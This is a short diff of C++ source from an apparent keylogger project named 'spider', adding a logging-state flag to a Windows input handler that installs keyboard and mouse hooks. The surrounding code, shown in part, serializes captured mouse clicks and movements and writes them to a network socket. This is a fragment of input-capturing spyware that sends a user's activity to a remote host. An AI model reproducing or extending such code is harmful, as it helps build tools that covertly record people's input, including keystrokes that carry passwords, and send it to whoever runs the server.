@@ -11,6 +11,7 @@ namespace spider
 
 	WindowsInputHandler::WindowsInputHandler(LPVOID lpParam)
 	{
+		_isLogging = false;
 		_lpParam = lpParam;
 		_hInstance = GetModuleHandle(NULL);
 		if (!_hInstance)
@@ -19,8 +20,11 @@ namespace spider
 
 	WindowsInputHandler::~WindowsInputHandler()
 	{
-		_unregisterKeyboardHook();
-		_unregisterMouseHook();
+		if (_isLogging)
+		{
+			_unregisterKeyboardHook();
+			_unregisterMouseHook();
+		}
 	}
 
 	//
@@ -32,25 +36,30 @@ namespace spider
 		if (!_hInstance)
 			return 1;
 
-		if (keyboard)
+		if (!_isLogging)
 		{
 			_registerKeyboardHook();
-		}
-
-		if (mouse)
-		{
 			_registerMouseHook();
+			_isLogging = true;
 		}
 		return 0;
 	}
 
 	int WindowsInputHandler::stopLogging(bool keyboard, bool mouse)
 	{
-		if (keyboard)
+		if (_isLogging)
+		{
 			_unregisterKeyboardHook();
-		if (mouse)
 			_unregisterMouseHook();
-		return 0;
+			_isLogging = false;
+			return 0;
+		}
+		return 1;
+	}
+
+	bool WindowsInputHandler::isLogging() const
+	{
+		return _isLogging;
 	}
 
 	//
@@ -165,7 +174,6 @@ namespace spider
 			mouseClic->timestamp = hookedMouse.time;
 			mouseClic->x = p.x;
 			mouseClic->y = p.y;
-			// TODO: Send to input queue
 			sock.write<PackageCMDMouseClic>(spider::PacketSerializer<PackageCMDMouseClic>(
 				sizeof(PackageHeader) + sizeof(PackageCMDMouseClic), 666, *mouseClic));
 			//std::cout << " Right click ";
@@ -176,7 +184,6 @@ namespace spider
 			mouseMove->timestamp = hookedMouse.time;
 			mouseMove->x = p.x;
 			mouseMove->y = p.y;
-			// TODO: Send to input queue
 			sock.write<PackageCMDMouseMove>(spider::PacketSerializer<PackageCMDMouseMove>(
 				sizeof(PackageHeader) + sizeof(PackageCMDMouseMove), 666, *mouseMove));
 			//std::cout << " Movement ";
